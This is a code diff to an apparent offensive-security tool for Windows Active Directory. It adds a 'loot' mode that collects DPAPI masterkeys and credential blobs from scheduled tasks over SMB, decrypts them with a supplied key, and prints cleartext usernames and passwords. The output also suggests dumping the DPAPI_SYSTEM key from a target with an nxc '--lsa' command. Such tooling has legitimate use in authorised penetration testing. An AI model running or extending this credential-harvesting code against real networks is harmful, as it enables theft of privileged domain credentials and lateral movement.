@@ -23,7 +23,7 @@ from .smb.credguard import check_credential_guard
 
 def process_offline_directory(offline_dir: str, hv: Optional[HighValueLoader], 
                              show_unsaved_creds: bool, include_local: bool, all_rows: List[Dict], debug: bool,
-                             no_ldap: bool = False) -> List[str]:
+                             no_ldap: bool = False, dpapi_key: Optional[str] = None) -> List[str]:
     # Process previously collected XML files from a directory structure.
     #
     # Expected directory structure:
@@ -40,10 +40,27 @@ def process_offline_directory(offline_dir: str, hv: Optional[HighValueLoader],
         warn(f"Offline directory does not exist or is not a directory: {offline_dir}")
         return out_lines
     
+    # Check if offline_dir itself is a dpapi_loot structure (for direct decryption)
+    has_masterkeys = os.path.exists(os.path.join(offline_dir, "masterkeys"))
+    has_credentials = os.path.exists(os.path.join(offline_dir, "credentials"))
+    
+    if has_masterkeys and has_credentials and dpapi_key:
+        # This is a direct dpapi_loot directory, process it directly
+        hostname = os.path.basename(offline_dir)
+        info(f"Detected DPAPI loot directory structure for {hostname}")
+        dpapi_lines = _process_offline_dpapi_decryption(hostname, offline_dir, dpapi_key, debug)
+        out_lines.extend(dpapi_lines)
+        
+        # Also process any XML files in this directory
+        lines = _process_offline_host(hostname, offline_dir, hv, show_unsaved_creds, include_local, all_rows, debug, no_ldap)
+        out_lines.extend(lines)
+        return out_lines
+    
     # Look for host directories (subdirectories of offline_dir)
     try:
         host_dirs = [d for d in os.listdir(offline_dir) 
-                    if os.path.isdir(os.path.join(offline_dir, d))]
+                    if os.path.isdir(os.path.join(offline_dir, d)) 
+                    and not d.startswith('.')]
     except Exception as e:
         warn(f"Failed to list offline directory {offline_dir}: {e}")
         return out_lines
@@ -55,12 +72,88 @@ def process_offline_directory(offline_dir: str, hv: Optional[HighValueLoader],
     total_hosts = len(host_dirs)
     good(f"Offline mode: Found {total_hosts} host directories to process")
     
+    # If dpapi_key provided, decrypt collected DPAPI files first
+    if dpapi_key:
+        info("DPAPI key provided - will decrypt collected credential files")
+        for host in host_dirs:
+            host_path = os.path.join(offline_dir, host)
+            dpapi_lines = _process_offline_dpapi_decryption(host, host_path, dpapi_key, debug)
+            out_lines.extend(dpapi_lines)
+    
+    # Process task XML files
     for host in host_dirs:
         host_path = os.path.join(offline_dir, host)
         lines = _process_offline_host(host, host_path, hv, show_unsaved_creds, include_local, all_rows, debug, no_ldap)
         out_lines.extend(lines)
     
     return out_lines
+
+
+def _process_offline_dpapi_decryption(hostname: str, host_dir: str, dpapi_key: str, debug: bool) -> List[str]:
+    """Process DPAPI files from offline collection"""
+    out_lines: List[str] = []
+    
+    # Check if this directory has dpapi_loot structure
+    # Priority order:
+    # 1. Check if current directory has masterkeys/ (direct dpapi_loot structure)
+    # 2. Check for dpapi_loot/ subdirectory (--backup --loot combined structure)
+    # 3. Check for dpapi_loot/hostname subdirectory (legacy structure)
+    
+    dpapi_loot_dir = None
+    
+    if os.path.exists(os.path.join(host_dir, "masterkeys")):
+        # Direct dpapi_loot structure
+        dpapi_loot_dir = host_dir
+    elif os.path.exists(os.path.join(host_dir, "dpapi_loot", "masterkeys")):
+        # Combined --backup --loot structure: backup_dir/hostname/dpapi_loot/
+        dpapi_loot_dir = os.path.join(host_dir, "dpapi_loot")
+    elif os.path.exists(os.path.join(host_dir, "dpapi_loot", hostname, "masterkeys")):
+        # Legacy structure: dpapi_loot/hostname/
+        dpapi_loot_dir = os.path.join(host_dir, "dpapi_loot", hostname)
+    
+    if not dpapi_loot_dir:
+        # No DPAPI files found for this host
+        return out_lines
+    
+    try:
+        from .dpapi.looter import decrypt_offline_dpapi_files
+        
+        info(f"{hostname}: Decrypting DPAPI files from offline collection...")
+        decrypted_creds = decrypt_offline_dpapi_files(dpapi_loot_dir, dpapi_key)
+        
+        if decrypted_creds:
+            good(f"{hostname}: Successfully decrypted {len(decrypted_creds)} Task Scheduler credentials!")
+            out_lines.append("")
+            out_lines.append(f"{'=' * 80}")
+            out_lines.append(f"DECRYPTED CREDENTIALS FROM OFFLINE DPAPI FILES - {hostname}")
+            out_lines.append(f"{'=' * 80}")
+            out_lines.append("")
+            out_lines.append("NOTE: Task GUIDs from credential TargetName field:")
+            out_lines.append("      Domain:batch=TaskScheduler:Task:{GUID}")
+            out_lines.append("      If task is deleted, credential blob persists (orphaned credential)")
+            out_lines.append("")
+            
+            for cred in decrypted_creds:
+                out_lines.append("")
+                out_lines.append(f"Task Name    : {cred.task_name or '(Unknown - see Task GUID)'}")
+                out_lines.append(f"Task GUID    : {cred.target}")
+                out_lines.append(f"Username     : {cred.username}")
+                out_lines.append(f"Password     : {cred.password}")
+                out_lines.append(f"Blob File    : {cred.blob_path}")
+                out_lines.append(f"{'-' * 80}")
+            
+            out_lines.append(f"{'=' * 80}")
+            out_lines.append("")
+        else:
+            info(f"{hostname}: No credentials decrypted from offline files")
+    
+    except Exception as e:
+        warn(f"{hostname}: Failed to decrypt offline DPAPI files: {e}")
+        if debug:
+            traceback.print_exc()
+    
+    return out_lines
+
 
 
 def _process_offline_host(hostname: str, host_dir: str, hv: Optional[HighValueLoader],
@@ -240,7 +333,7 @@ def _format_block(kind: str, rel_path: str, runas: str, what: str, author: str, 
                   hv: Optional[HighValueLoader] = None, no_ldap: bool = False, 
                   domain: Optional[str] = None, username: Optional[str] = None, 
                   password: Optional[str] = None, hashes: Optional[str] = None,
-                  enabled: Optional[str] = None) -> List[str]:
+                  enabled: Optional[str] = None, decrypted_creds: Optional[List] = None) -> List[str]:
     # Format a small pretty-print block used by the CLI output.
     #
     # kind is either 'TIER-0', 'PRIV' (privileged/high-value) or 'TASK' (normal task).
@@ -272,27 +365,73 @@ def _format_block(kind: str, rel_path: str, runas: str, what: str, author: str, 
     
     if kind in ["TIER-0", "PRIV"]:
         if extra_reason:
-            base.append(f"        Reason : {extra_reason}")
+            base.append(f"        Reason  : {extra_reason}")
         elif kind == "TIER-0":
-            base.append("        Reason : Tier 0 privileged group membership")
+            base.append("        Reason  : Tier 0 privileged group membership")
         else:
-            base.append("        Reason : High Value match found (Check BloodHound Outbound Object Control for Details)")
+            base.append("        Reason  : High Value match found (Check BloodHound Outbound Object Control for Details)")
         
         # Add password analysis if available
         if password_analysis:
             base.append(f"        Password Analysis : {password_analysis}")
-            
-        # Add consistent next step for all privileged tasks
-        # This logic is only for pretty output, so we check for the typical reason string and absence of 'no_saved_credentials'
-        if (not extra_reason or "no saved credentials" not in extra_reason.lower()):
+        
+        # Check if we have a decrypted password for this user
+        decrypted_password = None
+        if decrypted_creds:
+            # Normalize the runas for comparison
+            runas_normalized = runas.lower()
+            for cred in decrypted_creds:
+                if cred.username:
+                    cred_user_normalized = cred.username.lower()
+                    # Match full domain\user or partial matches
+                    if cred_user_normalized == runas_normalized:
+                        # Exact match
+                        decrypted_password = cred.password
+                        break
+                    elif '\\' in cred_user_normalized and '\\' not in runas_normalized:
+                        # Cred has domain, runas doesn't - match on username part only
+                        if cred_user_normalized.split('\\')[-1] == runas_normalized:
+                            decrypted_password = cred.password
+                            break
+                    # Note: We DON'T match when runas has domain but cred doesn't
+                    # A credential without domain is likely a local account, not domain account
+        
+        # Show decrypted password if available, otherwise show next step
+        if decrypted_password:
+            base.append(f"        Decrypted Password : {decrypted_password}")
+        elif (not extra_reason or "no saved credentials" not in extra_reason.lower()):
             base.append("        Next Step: Try DPAPI Dump / Task Manipulation")
     
     # Add password analysis for regular TASK entries too (if available)
-    elif kind == "TASK" and password_analysis:
-        base.append(f"        Password Analysis : {password_analysis}")
+    elif kind == "TASK":
+        if password_analysis:
+            base.append(f"        Password Analysis : {password_analysis}")
         
-        # Add consistent next step for regular tasks with password analysis
-        base.append("        Next Step: Try DPAPI Dump / Task Manipulation")
+        # Check if we have a decrypted password for this user
+        decrypted_password = None
+        if decrypted_creds:
+            runas_normalized = runas.lower()
+            for cred in decrypted_creds:
+                if cred.username:
+                    cred_user_normalized = cred.username.lower()
+                    # Match full domain\user or partial matches
+                    if cred_user_normalized == runas_normalized:
+                        # Exact match
+                        decrypted_password = cred.password
+                        break
+                    elif '\\' in cred_user_normalized and '\\' not in runas_normalized:
+                        # Cred has domain, runas doesn't - match on username part only
+                        if cred_user_normalized.split('\\')[-1] == runas_normalized:
+                            decrypted_password = cred.password
+                            break
+                    # Note: We DON'T match when runas has domain but cred doesn't
+                    # A credential without domain is likely a local account, not domain account
+        
+        # Show decrypted password if available, otherwise show next step (if password_analysis exists)
+        if decrypted_password:
+            base.append(f"        Decrypted Password : {decrypted_password}")
+        elif password_analysis:
+            base.append("        Next Step: Try DPAPI Dump / Task Manipulation")
     
     return base
 
@@ -302,7 +441,8 @@ def process_target(target: str, domain: str, username: str, password: Optional[s
                    hv: Optional[HighValueLoader], debug: bool,
                    all_rows: List[Dict], hashes: Optional[str] = None,
                    show_unsaved_creds: bool = False, backup_dir: Optional[str] = None,
-                   credguard_detect: bool = False, no_ldap: bool = False) -> List[str]:
+                   credguard_detect: bool = False, no_ldap: bool = False, 
+                   loot: bool = False, dpapi_key: Optional[str] = None) -> List[str]:
     # Connect to `target`, enumerate scheduled tasks, and return printable lines.
     #
     # - Attempts SMB authentication using either cleartext password or hashes.
@@ -376,6 +516,75 @@ def process_target(target: str, domain: str, username: str, password: Optional[s
             warn(f"{target}: Failed to create backup directory {backup_target_dir}: {e}")
             backup_target_dir = None
 
+    # Perform automatic credential looting if requested
+    decrypted_creds = []  # Initialize to empty list
+    if loot:
+        if dpapi_key:
+            # Mode 1: Live decryption with DPAPI key
+            try:
+                from .dpapi.looter import loot_credentials
+                info(f"{target}: Starting DPAPI credential looting...")
+                decrypted_creds = loot_credentials(smb, dpapi_key)
+                
+                if decrypted_creds:
+                    good(f"{target}: Successfully decrypted {len(decrypted_creds)} Task Scheduler credentials!")
+                    # Credentials will be displayed inline with tasks below
+                else:
+                    info(f"{target}: No credentials decrypted (no matching masterkeys or no credential blobs found)")
+            
+            except Exception as e:
+                warn(f"{target}: DPAPI credential looting failed: {e}")
+                if debug:
+                    traceback.print_exc()
+        
+        else:
+            # Mode 2: Offline collection without DPAPI key
+            try:
+                from .dpapi.looter import collect_dpapi_files
+                
+                # Create loot directory structure
+                # If --backup is specified, nest DPAPI files inside backup directory
+                if backup_target_dir:
+                    loot_target_dir = os.path.join(backup_target_dir, "dpapi_loot")
+                else:
+                    loot_base_dir = "dpapi_loot"
+                    loot_target_dir = os.path.join(loot_base_dir, target)
+                
+                os.makedirs(loot_target_dir, exist_ok=True)
+                
+                info(f"{target}: Collecting DPAPI files for offline decryption...")
+                info(f"{target}: Saving to: {loot_target_dir}")
+                
+                stats = collect_dpapi_files(smb, loot_target_dir)
+                
+                good(f"{target}: Collected {stats['masterkeys']} masterkeys and {stats['credentials']} credential blobs")
+                
+                out_lines.append("")
+                out_lines.append(f"{'=' * 80}")
+                out_lines.append(f"DPAPI FILES COLLECTED FOR OFFLINE DECRYPTION")
+                out_lines.append(f"{'=' * 80}")
+                out_lines.append("")
+                out_lines.append(f"Output Directory : {loot_target_dir}")
+                out_lines.append(f"Masterkeys       : {stats['masterkeys']} files (in masterkeys/)")
+                out_lines.append(f"Credential Blobs : {stats['credentials']} files (in credentials/)")
+                out_lines.append("")
+                out_lines.append(f"NEXT STEPS:")
+                out_lines.append(f"  1. Obtain DPAPI_SYSTEM userkey:")
+                out_lines.append(f"     nxc smb {target} -u <user> -p <pass> --lsa")
+                out_lines.append(f"")
+                out_lines.append(f"  2. Decrypt with the userkey:")
+                out_lines.append(f"     taskhound -t {target} -u <user> -p <pass> \\")
+                out_lines.append(f"              --loot --dpapi-key <dpapi_userkey>")
+                out_lines.append(f"")
+                out_lines.append(f"See {os.path.join(loot_target_dir, 'README.txt')} for detailed instructions")
+                out_lines.append(f"{'=' * 80}")
+                out_lines.append("")
+            
+            except Exception as e:
+                warn(f"{target}: DPAPI file collection failed: {e}")
+                if debug:
+                    traceback.print_exc()
+
     total = len(items)
     priv_count = 0
     priv_lines: List[str] = []
@@ -396,6 +605,7 @@ def process_target(target: str, domain: str, username: str, password: Optional[s
             except Exception as e:
                 if debug:
                     warn(f"{target}: Failed to backup {rel_path}: {e}")
+                    
         runas = meta.get("runas")
         if not runas:
             continue
@@ -435,7 +645,8 @@ def process_target(target: str, domain: str, username: str, password: Optional[s
                     priv_lines.extend(_format_block("TIER-0", rel_path, runas, what, meta.get("author"), meta.get("date"), 
                                                    extra_reason=reason, password_analysis=password_analysis, 
                                                    hv=hv, no_ldap=no_ldap, domain=domain, username=username, 
-                                                   password=password, hashes=hashes, enabled=meta.get("enabled")))
+                                                   password=password, hashes=hashes, enabled=meta.get("enabled"),
+                                                   decrypted_creds=decrypted_creds))
                     priv_count += 1
                     row["type"] = "TIER-0"
                     row["reason"] = reason
@@ -457,7 +668,8 @@ def process_target(target: str, domain: str, username: str, password: Optional[s
                     priv_lines.extend(_format_block("PRIV", rel_path, runas, what, meta.get("author"), meta.get("date"), 
                                                    extra_reason=reason, password_analysis=password_analysis, 
                                                    hv=hv, no_ldap=no_ldap, domain=domain, username=username, 
-                                                   password=password, hashes=hashes, enabled=meta.get("enabled")))
+                                                   password=password, hashes=hashes, enabled=meta.get("enabled"),
+                                                   decrypted_creds=decrypted_creds))
                     priv_count += 1
                     row["type"] = "PRIV"
                     row["reason"] = reason
@@ -481,7 +693,8 @@ def process_target(target: str, domain: str, username: str, password: Optional[s
                 if not (row.get("credentials_hint") == "no_saved_credentials" and not show_unsaved_creds):
                     task_lines.extend(_format_block("TASK", rel_path, runas, what, meta.get("author"), meta.get("date"), 
                                                    password_analysis=password_analysis, hv=hv, no_ldap=no_ldap, 
-                                                   domain=domain, username=username, password=password, hashes=hashes, enabled=meta.get("enabled")))
+                                                   domain=domain, username=username, password=password, hashes=hashes, enabled=meta.get("enabled"),
+                                                   decrypted_creds=decrypted_creds))
             row["password_analysis"] = password_analysis
             
         if not (row.get("credentials_hint") == "no_saved_credentials" and not show_unsaved_creds):
@@ -489,5 +702,9 @@ def process_target(target: str, domain: str, username: str, password: Optional[s
 
     lines = priv_lines + task_lines
     backup_msg = f", {total} raw XMLs backed up" if backup_target_dir else ""
+    
     good(f"{target}: Found {total} tasks, privileged {priv_count if (hv and hv.loaded) else 'N/A'}{backup_msg}")
-    return lines
+    
+    # Combine credential loot output with task listing output
+    # Put credentials first since they're the most valuable
+    return out_lines + lines
